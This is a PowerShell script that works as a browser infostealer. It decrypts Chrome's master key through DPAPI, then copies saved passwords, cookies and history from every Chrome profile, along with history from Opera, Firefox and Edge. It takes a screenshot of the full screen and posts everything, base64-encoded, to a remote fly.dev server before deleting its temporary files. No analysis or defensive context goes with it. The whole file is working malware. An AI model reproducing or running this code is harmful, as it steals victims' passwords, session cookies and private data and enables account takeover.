$masterurl = "https://hello-flask-poetry-wandering-brook-7760.fly.dev"

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

# CHROME start
Write-Output "chrome start"
Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Local State" "$($env:USERPROFILE)\out3.f"
$base64string3 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out3.f"))
Write-Output $base64string3 > "$($env:USERPROFILE)\out3.txt"
$localStateInfo = Get-Content "$($env:USERPROFILE)\out3.f" -Raw | ConvertFrom-Json
if ($localStateInfo) { $encryptedkey = [convert]::FromBase64String($localStateInfo.os_crypt.encrypted_key) }
if ($encryptedkey -and [string]::new($encryptedkey[0..4]) -eq 'DPAPI') {
    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(($encryptedkey | Select-Object -Skip 5), $null, 'CurrentUser')
}
$base64string4 = [Convert]::ToBase64String($masterKey)
Write-Output $base64string4 > "$($env:USERPROFILE)\out5.txt"
$users = $localStateInfo.profile.info_cache | Get-Member -MemberType NoteProperty | Select-Object -ExpandProperty Name
For ($i = 0; $i -lt $users.Length; $i++) {
    write-output $users[$i]
    write-output "history"
    Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\History" "$($env:USERPROFILE)\out.f"
    $base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
    Invoke-WebRequest -Uri "$($masterurl)/saveHistory" -Method POST -Body @{text = $base64string1; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
    write-output "passwords"
    Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\Login Data" "$($env:USERPROFILE)\out2.f"
    $base64string2 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out2.f"))
    Invoke-WebRequest -Uri "$($masterurl)/saveSavedPasswords" -Method POST -Body @{db = $base64string2; masterKey = Get-Content "$($env:USERPROFILE)\out5.txt" -Raw; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
    if (Test-Path "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\Cookies") {
        write-output "cookies"
        Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\Cookies" "$($env:USERPROFILE)\out4.f"
        $base64string5 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out4.f"))
        Invoke-WebRequest -Uri "$($masterurl)/saveCookie" -Method POST -Body @{text = $base64string5; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
    }
    Remove-Item "$($env:USERPROFILE)\out.f"
    Remove-Item "$($env:USERPROFILE)\out2.f"
    Remove-Item "$($env:USERPROFILE)\out4.f"
}
Invoke-WebRequest -Uri "$($masterurl)/saveAesKey" -Method POST -Body @{masterKey = Get-Content "$($env:USERPROFILE)\out5.txt" -Raw; name = "chrome"; username = $Env:UserName; ComputerName = $Env:ComputerName }
Remove-Item "$($env:USERPROFILE)\out3.txt"
Remove-Item "$($env:USERPROFILE)\out3.f"
Remove-Item "$($env:USERPROFILE)\out5.txt"
Remove-Item "$($env:USERPROFILE)\out5.f"
Write-Output "chrome end"
# CHROME end

# OPERA start
write-output "opera start"
Copy-Item "$($env:USERPROFILE)\AppData\Roaming\Opera Software\Opera Stable\Default\History" "$($env:USERPROFILE)\out.f"
$base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
Invoke-WebRequest -Uri "$($masterurl)/saveOperaHistory" -Method POST -Body @{text = $base64string1; name = "Default"; username = $Env:UserName; ComputerName = $Env:ComputerName }
Remove-Item "$($env:USERPROFILE)\out.f"
write-output "opera end"
# OPERA end

# FIREFOX start
write-output "firefox start"
Get-ChildItem "$($env:USERPROFILE)\AppData\Roaming\Mozilla\Firefox\Profiles" | Foreach-Object {
    $pathh = $_.FullName
    if (Test-Path "$($pathh)\places.sqlite") {
        Copy-Item "$($pathh)\places.sqlite" "$($env:USERPROFILE)\out.f"
        $base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
        Invoke-WebRequest -Uri "$($masterurl)/saveFirefoxHistory" -Method POST -Body @{text = $base64string1; name = $_.Name; username = $Env:UserName; ComputerName = $Env:ComputerName }
        Remove-Item "$($env:USERPROFILE)\out.f"
    }
}
write-output "firefox end"
# FIREFOX end

# EDGE start
write-output "edge start"
Copy-Item "$($env:USERPROFILE)\AppData\Local\Microsoft\Edge\User Data\Default\History" "$($env:USERPROFILE)\out.f"
$base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
Invoke-WebRequest -Uri "$($masterurl)/saveEdgeHistory" -Method POST -Body @{text = $base64string1; name = "Default"; username = $Env:UserName; ComputerName = $Env:ComputerName }
Remove-Item "$($env:USERPROFILE)\out.f"
write-output "edge end"
# EDGE end

# SCREENSHOT start
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
# convert to base64
$stream = New-Object System.IO.MemoryStream
$bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
$base64 = [Convert]::ToBase64String($stream.ToArray())
$stream.Close()
$graphic.Dispose()
$bitmap.Dispose()
Invoke-WebRequest -Uri "$($masterurl)/saveScreenshot" -Method POST -Body @{data = $base64; username = $Env:UserName; ComputerName = $Env:ComputerName } 
# SCREENSHOT end

